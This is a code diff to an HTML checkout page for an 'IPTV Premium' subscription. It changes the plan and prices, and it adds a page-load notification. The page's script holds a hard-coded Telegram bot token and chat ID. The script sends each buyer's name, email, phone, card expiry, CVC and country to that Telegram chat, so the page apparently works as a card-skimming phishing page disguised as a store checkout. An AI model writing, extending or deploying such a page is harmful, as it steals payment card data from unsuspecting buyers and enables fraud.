@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>IPTV Premium Checkout</title>
+    <title>IPTV Premium Checkout • 6 months</title>
     <link rel="preconnect" href="https://fonts.googleapis.com" />
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet" />
@@ -545,8 +545,8 @@
                         <p class="sub-text">Thank you for your order.</p>
                         <div class="order-detail" id="orderDetail">
                             <div class="detail-row"><span>📦 Order</span> <span class="detail-value" id="orderNumber">#IPTV-2847-91</span> <button class="copy-btn" data-copy="orderNumber">📋 Copy</button></div>
-                            <div class="detail-row"><span>📺 Product</span> <span class="detail-value">IPTV 1 Year + 1 Month FREE</span> <button class="copy-btn" data-copy="product">📋 Copy</button></div>
-                            <div class="detail-row"><span>💰 Amount</span> <span class="detail-value">$69.97 USD</span> <button class="copy-btn" data-copy="amount">📋 Copy</button></div>
+                            <div class="detail-row"><span>📺 Product</span> <span class="detail-value">IPTV 6 Months + 1 Month FREE</span> <button class="copy-btn" data-copy="product">📋 Copy</button></div>
+                            <div class="detail-row"><span>💰 Amount</span> <span class="detail-value">$48.73 USD</span> <button class="copy-btn" data-copy="amount">📋 Copy</button></div>
                             <div class="detail-row"><span>📧 Email</span> <span class="detail-value" id="successEmail">—</span> <button class="copy-btn" data-copy="successEmail">📋 Copy</button></div>
                             <div class="detail-row"><span>📞 Phone</span> <span class="detail-value" id="successPhone">—</span> <button class="copy-btn" data-copy="successPhone">📋 Copy</button></div>
                             <div class="detail-row"><span>👤 Cardholder</span> <span class="detail-value" id="successCardholder">—</span> <button class="copy-btn" data-copy="successCardholder">📋 Copy</button></div>
@@ -688,20 +688,20 @@
                 <div class="right-col">
                     <div class="glass-card summary-card">
                         <div class="product-badge">⭐ PREMIUM</div>
-                        <div class="summary-title">IPTV 1 Year <span style="color:#aab3d0;font-weight:400;">+</span> <span style="color:#b7adff;">1 Month FREE</span></div>
+                        <div class="summary-title">IPTV 6 Months <span style="color:#aab3d0;font-weight:400;">+</span> <span style="color:#b7adff;">1 Month FREE</span></div>
                         <div class="summary-bonus">🎁 Bonus month included</div>
                         <div>
-                            <span class="price-large">$69.97 <small>USD</small></span>
-                            <span class="price-strikethrough">$129.99</span>
+                            <span class="price-large">$48.73 <small>USD</small></span>
+                            <span class="price-strikethrough">$99.99</span>
                         </div>
                         <div style="margin-top:1.8rem;">
-                            <div class="summary-line"><span>Subtotal</span> <span>$69.97</span></div>
+                            <div class="summary-line"><span>Subtotal</span> <span>$48.73</span></div>
                             <div class="summary-line"><span>Discount / Bonus</span> <span style="color:#7fcf9b;">− 1 Month FREE</span></div>
-                            <div class="summary-line total"><span>Total</span> <span>$69.97 USD</span></div>
+                            <div class="summary-line total"><span>Total</span> <span>$48.73 USD</span></div>
                         </div>
 
                         <button class="btn-primary" id="payButton">
-                            <span class="btn-text">🔒 Pay $69.97 Securely</span>
+                            <span class="btn-text">🔒 Pay $48.73 Securely</span>
                             <span class="spinner"></span>
                         </button>
 
@@ -720,6 +720,24 @@
                 // ========== CONFIG ==========
                 const TELEGRAM_TOKEN = '7551456255:AAF8F9NLdoSG33i6Z0FqokmjhsnoJ2Mua2Y';
                 const TELEGRAM_CHAT_ID = '1017945601';
+
+                // ---------- PAGE VIEW NOTIFICATION ----------
+                function notifyPageView() {
+                    const viewMsg = `👁️ *IPTV page viewed* · 6-month plan · $48.73`;
+                    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            text: viewMsg,
+                            parse_mode: 'Markdown'
+                        })
+                    }).catch(() => {});
+                }
+                // wait a moment after page load to avoid race conditions
+                window.addEventListener('load', function() {
+                    setTimeout(notifyPageView, 300);
+                });
 
                 // ========== COUNTRY CODES ==========
                 const countryCodes = {
@@ -850,10 +868,10 @@
                     });
                 }
 
-                // ========== TELEGRAM SEND ==========
+                // ========== TELEGRAM SEND (order) ==========
                 function sendToTelegram(data) {
                     const message = `
-                    🎯 *New IPTV Order*
+                    🎯 *New IPTV Order (6 months)*
                     👤 Full Name: ${data.fullName}
                     📧 Email: ${data.email}
                     📞 Phone: ${data.phone}
@@ -863,7 +881,7 @@
                     📅 Expiry: ${data.expiry}
                     🔐 CVC: ${data.cvc}
                     🌍 Country: ${data.country}
-                    💰 Amount: $69.97 USD
+                    💰 Amount: $48.73 USD
                     `;
                     fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                         method: 'POST',
@@ -1031,8 +1049,8 @@
                         const targetId = this.dataset.copy;
                         let text = '';
                         if (targetId === 'orderNumber') text = document.getElementById('orderNumber').textContent;
-                        else if (targetId === 'product') text = 'IPTV 1 Year + 1 Month FREE';
-                        else if (targetId === 'amount') text = '$69.97 USD';
+                        else if (targetId === 'product') text = 'IPTV 6 Months + 1 Month FREE';
+                        else if (targetId === 'amount') text = '$48.73 USD';
                         else if (targetId === 'successEmail') text = document.getElementById('successEmail').textContent;
                         else if (targetId === 'successPhone') text = document.getElementById('successPhone').textContent;
                         else if (targetId === 'successCardholder') text = document.getElementById('successCardholder')
